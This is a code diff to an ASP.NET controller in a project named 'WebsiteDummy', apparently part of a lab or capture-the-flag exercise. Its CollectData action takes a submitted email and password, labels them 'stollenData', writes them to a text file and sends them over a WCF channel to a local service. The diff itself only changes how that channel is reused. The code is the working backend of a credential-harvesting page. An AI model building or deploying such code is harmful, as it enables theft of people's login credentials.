@@ -13,6 +13,8 @@ namespace WebsiteDummy.Controllers
 {
 	public class HomeController : Controller
 	{
+		static IFlag channel = null;
+
 		public ActionResult Index()
 		{
 
@@ -22,6 +24,8 @@ namespace WebsiteDummy.Controllers
 		[HttpPost]
 		public ActionResult CollectData(string email, string password)
 		{
+		
+
 			string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();
 
 			string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
@@ -36,7 +40,11 @@ namespace WebsiteDummy.Controllers
 
 
 			ChannelFactory<IFlag> factory = new ChannelFactory<IFlag>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:4000/IFlag"));
-			IFlag channel = factory.CreateChannel();
+			if (channel == null)
+			{
+				channel = factory.CreateChannel();
+			}
+
 			channel.SendData(stollenData);
 
 
